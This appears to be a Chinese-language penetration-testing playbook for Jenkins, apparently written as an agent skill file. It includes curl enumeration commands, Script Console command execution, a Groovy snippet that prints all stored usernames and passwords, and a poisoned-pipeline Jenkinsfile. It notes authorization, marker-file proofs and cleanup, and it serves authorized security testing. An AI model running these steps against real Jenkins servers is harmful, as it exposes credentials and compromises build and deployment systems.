# Jenkins 攻击链

---

## 1. 识别 / API / 权限

```bash
curl -sI http://JENKINS:8080/ | grep -iE 'x-jenkins|x-hudson'
curl -s http://JENKINS:8080/api/json?pretty=true
```

已知账号/token：

```bash
curl -s -u 'USER:TOKEN' 'http://JENKINS:8080/api/json?tree=jobs[name,url,color]'
curl -s -u 'USER:TOKEN' 'http://JENKINS:8080/computer/api/json?tree=computer[displayName,offline,executors[*]]'
```

先判断：

```text
Overall/Read
Job/Read Build Configure
Credentials/View Update
Agent/Build Configure Connect
Overall/Administer
Script Console
```

---

## 2. Script Console

仅在已有相应授权时：

```groovy
println "whoami".execute().text
println new File('/etc/hostname').text
```

成功即证明 Controller server-side code execution。不要为了“继续CI/CD”重复做Linux提权；如果当前链目标是 Jenkins credential/agent/deploy，可以继续 Jenkins 控制面。

---

## 3. Credential Store

Script Console 权限允许通过 Jenkins API访问 credential object；不要只去读 `credentials.xml`。

```groovy
import com.cloudbees.plugins.credentials.*
import com.cloudbees.plugins.credentials.common.*

def cs = CredentialsProvider.lookupCredentials(
  StandardUsernamePasswordCredentials.class,
  Jenkins.instance,
  null,
  null
)
cs.each { c -> println("${c.id}: ${c.username} / ${c.password}") }
```

离线解密需要匹配 Jenkins home 中的 credential XML、`secrets/master.key`、`secrets/hudson.util.Secret` 等；文件不全时不要宣称可解密。

---

## 4. Poisoned Pipeline Execution

仓库/Job Configure 任一入口都可能形成 PPE。

```groovy
pipeline {
  agent any
  stages {
    stage('Proof') {
      steps {
        sh 'id; printf CICD_PPE_PROOF > /tmp/cicd-ppe-proof'
      }
    }
  }
}
```

继续判断：

```text
运行在哪个Agent？
绑定了哪些credentials？
是否有deploy/cloud/kubeconfig？
Job是否能写artifact/registry？
```

---

## 5. Shared Libraries / Global Pipeline Trust

搜索 Jenkinsfile：

```text
@Library('name')
@Library('name@branch')
library identifier
```

如果低权限用户能修改被多条高权限 pipeline 信任的 Shared Library repo/ref，可形成组织级 PPE。验证应使用 marker commit，并记录受影响 jobs。

---

## 6. Agent / Workspace

Agent侧见 **runner-agent.md**。重点不是泛化“agent→controller”，而是：

```text
低信任job能否落到高价值agent
agent是否non-ephemeral
workspace/tool/cache是否跨job
controller是否向该job绑定高价值credential
```

---

## 7. Cleanup

如果修改 Jenkinsfile/Job config：
1. 记录原 commit/config XML；
2. 验证后恢复；
3. 删除测试 artifact/marker/job；
4. 如读取真实 credential，记录暴露范围，不在技能里自动轮换生产凭据。
